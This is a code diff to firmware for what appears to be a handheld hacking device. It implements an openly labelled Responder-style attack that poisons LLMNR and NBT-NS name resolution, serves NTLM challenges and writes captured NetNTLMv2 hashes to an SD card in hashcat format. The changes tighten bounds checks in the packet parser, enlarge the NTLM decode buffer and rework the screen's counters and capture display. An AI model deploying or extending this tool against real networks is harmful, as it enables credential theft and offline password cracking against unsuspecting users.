@@ -43,15 +43,17 @@ static void rspPush(uint8_t proto, const char* name) {
 
 // ── DNS name (LLMNR) → dotted string; returns question length (name+qtype+qclass)
 static int dnsParseName(const uint8_t* p, int len, char* out, int outSz) {
+    if (len < 12) return -1;
     int i = 12, o = 0;   // questions start at offset 12
     while (i < len && p[i] != 0) {
         int l = p[i++];
         if (l > 63 || i + l > len) return -1;
         for (int j = 0; j < l && o < outSz - 1; j++) out[o++] = (char)p[i++];
-        if (p[i] != 0 && o < outSz - 1) out[o++] = '.';
+        if (i < len && p[i] != 0 && o < outSz - 1) out[o++] = '.';   // i<len: no OOB read
     }
     out[o] = '\0';
-    return (i + 1 + 4) - 12;   // past the terminating 0 + qtype(2) + qclass(2)
+    if (i + 1 + 4 > len) return -1;    // truncated: no terminator + qtype + qclass
+    return (i + 1 + 4) - 12;           // name + terminating 0 + qtype(2) + qclass(2)
 }
 
 // ── NetBIOS first-level name decode (32 enc chars → ≤15 char name) ─────────────
@@ -73,7 +75,7 @@ static void llmnrRecv(void* arg, struct udp_pcb* pcb, struct pbuf* p,
         uint8_t* q = (uint8_t*)p->payload;
         char name[40];
         int qlen = dnsParseName(q, p->len, name, sizeof(name));
-        if (qlen > 0) {
+        if (qlen > 0 && qlen <= 100) {   // 12 + qlen + 16-byte answer must fit out[128]
             uint8_t out[128]; int n = 0;
             out[0]=q[0]; out[1]=q[1];            // txid
             out[2]=0x80; out[3]=0x00;            // flags: response
@@ -154,7 +156,7 @@ static String utf16leToAscii(const uint8_t* d, int n) {
 // Parse an NTLM Type-3 and, on success, write a hashcat -m 5600 line. Returns
 // the "user" for the UI, or "" if not a usable Type-3.
 static String ntlmType3Capture(const String& b64, const IPAddress& src) {
-    uint8_t dec[1024]; size_t dl = 0;
+    uint8_t dec[2048]; size_t dl = 0;   // room for Type-3 with large AV target-info blobs
     if (mbedtls_base64_decode(dec, sizeof(dec), &dl, (const unsigned char*)b64.c_str(), b64.length()) != 0)
         return "";
     if (dl < 52 || memcmp(dec, "NTLMSSP", 7) != 0 || dec[8] != 0x03) return "";
@@ -215,18 +217,20 @@ void runResponder(char* args) {
     String type2 = ntlmType2B64();
 
     // ── static UI ─────────────────────────────────────────────────────────────
+    const int statY = 110, listLblY = 130, listY = 146, capY = 192;
     auto drawStatic = [&]() {
         dm.clearScreen();
-        int y = 40;
-        dm.setTextColor(TFT_RED);  dm.setCursor(10, y); dm.printText("[RESPONDER]  [EXP]"); y += 18;
-        dm.setTextColor(0x7BEF);   dm.setCursor(10, y); dm.printText("LLMNR/NBT poison + NetNTLMv2 -> SD"); y += 16;
-        dm.setTextColor(TFT_WHITE);dm.setCursor(10, y); dm.printText("as " + ip.toString()); y += 16;
-        dm.setCursor(10, 214); dm.setTextColor(0x7BEF); dm.printText("[q] stop   hashcat -m 5600");
+        dm.setTextColor(TFT_RED);    dm.setCursor(10, 40);  dm.printText("[RESPONDER]");
+        dm.setTextColor(0xFD20);     dm.setCursor(112, 40); dm.printText("[EXP]");
+        dm.setTextColor(0x7BEF);     dm.setCursor(10, 58);  dm.printText("LLMNR + NBT-NS poison -> NetNTLMv2");
+        dm.setTextColor(TFT_WHITE);  dm.setCursor(10, 76);  dm.printText("me  " + ip.toString());
+        dm.setTextColor(0x5AEB);     dm.setCursor(10, 92);  dm.printText("SD /apps/responder/hashes.txt");
+        dm.setTextColor(0x5AEB);     dm.setCursor(10, listLblY); dm.printText("recent name queries:");
+        dm.setTextColor(0x7BEF);     dm.setCursor(10, 214); dm.printText("[q] stop   crack: hashcat -m 5600");
     };
     drawStatic();
-    const int statY = 108, listY = 128, capY = 200;
 
-    uint32_t poisons = 0, caps = 0, lastDraw = 0;
+    uint32_t llmnrN = 0, nbtN = 0, caps = 0, lastDraw = 0;
     char lastNames[3][40] = {{0},{0},{0}};
     char lastCap[48] = {0};
     bool stop = false;
@@ -238,16 +242,16 @@ void runResponder(char* args) {
         while (s_rTail != s_rHead) {
             RspEvt e = *(RspEvt*)&s_ring[s_rTail];
             s_rTail = (s_rTail + 1) & 15;
-            poisons++;
+            if (e.proto) nbtN++; else llmnrN++;
             memmove(lastNames[0], lastNames[1], 40);
             memmove(lastNames[1], lastNames[2], 40);
-            snprintf(lastNames[2], 40, "%s %s", e.proto ? "NBT" : "LLM", e.name);
+            snprintf(lastNames[2], 40, "%s  %s", e.proto ? "NBT" : "LLM", e.name);
         }
 
         // service one HTTP client
         WiFiClient cl = http.available();
         if (cl) {
-            String req, auth;
+            String auth;
             uint32_t t0 = millis();
             while (cl.connected() && millis() - t0 < 1500) {
                 String ln = cl.readStringUntil('\n');
@@ -281,15 +285,21 @@ void runResponder(char* args) {
         uint32_t now = millis();
         if (now - lastDraw >= 400 && !displayManager.isBlocked()) {
             lastDraw = now;
+            // counters (green once a hash is captured)
             dm.fillRect(10, statY, SCREEN_WIDTH - 20, 14, TFT_BLACK);
-            dm.setCursor(10, statY); dm.setTextColor(TFT_GREEN);
-            char s[40]; snprintf(s, sizeof(s), "poisoned %lu   hashes %lu", (unsigned long)poisons, (unsigned long)caps);
+            dm.setCursor(10, statY); dm.setTextColor(caps ? TFT_GREEN : TFT_CYAN);
+            char s[48]; snprintf(s, sizeof(s), "LLMNR %lu  NBT %lu  HASH %lu",
+                                 (unsigned long)llmnrN, (unsigned long)nbtN, (unsigned long)caps);
             dm.printText(s);
-            dm.fillRect(10, listY, SCREEN_WIDTH - 20, 3 * 14, TFT_BLACK);
+            // recent poisoned names
+            dm.fillRect(10, listY, SCREEN_WIDTH - 20, 3 * 13, TFT_BLACK);
             dm.setTextColor(0xC618);
-            for (int i = 0; i < 3; i++) if (lastNames[i][0]) { dm.setCursor(10, listY + i * 14); dm.printText(String(lastNames[i])); }
+            for (int i = 0; i < 3; i++) if (lastNames[i][0]) { dm.setCursor(10, listY + i * 13); dm.printText(String(lastNames[i])); }
+            // latest capture (or waiting state)
             dm.fillRect(10, capY, SCREEN_WIDTH - 20, 14, TFT_BLACK);
-            if (lastCap[0]) { dm.setCursor(10, capY); dm.setTextColor(TFT_YELLOW); dm.printText(String("got ") + lastCap); }
+            dm.setCursor(10, capY);
+            if (lastCap[0]) { dm.setTextColor(TFT_YELLOW); dm.printText(String(">> ") + lastCap); }
+            else            { dm.setTextColor(0x5AEB);     dm.printText("waiting for NTLM auth..."); }
         }
         if (inputHandler.getKeyboardInput() == 'q') stop = true;
         delay(10);
